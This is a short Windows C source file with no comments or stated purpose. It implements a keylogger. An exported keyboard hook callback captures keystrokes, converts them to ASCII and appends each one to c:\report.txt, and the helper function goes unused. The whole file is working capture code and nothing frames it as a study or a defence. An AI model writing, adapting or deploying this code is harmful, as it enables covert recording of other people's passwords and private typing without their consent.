#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

static FILE* f1;
static HHOOK hkb;

static char toChar(WPARAM value) {
    BYTE keyboard_state[256];
    GetKeyboardState(keyboard_state);
    WORD w;
    UINT scan=0;

    if (value == VK_RETURN) return '\n';
    if (value == VK_SPACE) return ' ';
    ToAscii(value, scan, keyboard_state, &w, 0);
    return ((char) w);
}

LRESULT __declspec(dllexport)__stdcall CALLBACK keyboard_hook_callback(int ncode, WPARAM wparam, LPARAM lparam) {

    char ch;

    if (((DWORD)lparam & 0x40000000) &&(HC_ACTION==ncode))
    {
        if ((wparam==VK_SPACE)||(wparam==VK_RETURN)||(wparam>=0x2f ) &&(wparam<=0x100))
        {
            f1=fopen("c:\\report.txt","a+");
            if (wparam==VK_RETURN)
            {
                ch='\n';
                fwrite(&ch,1,1,f1);
            }
            else
            {
                BYTE ks[256];
                GetKeyboardState(ks);

                WORD w;
                UINT scan=0;
                ToAscii(wparam,scan,ks,&w,0);
                ch = (char) w;
                fwrite(&ch,1,1,f1);
            }
            fclose(f1);
        }
    }

    return CallNextHookEx(hkb, ncode, wparam, lparam);
}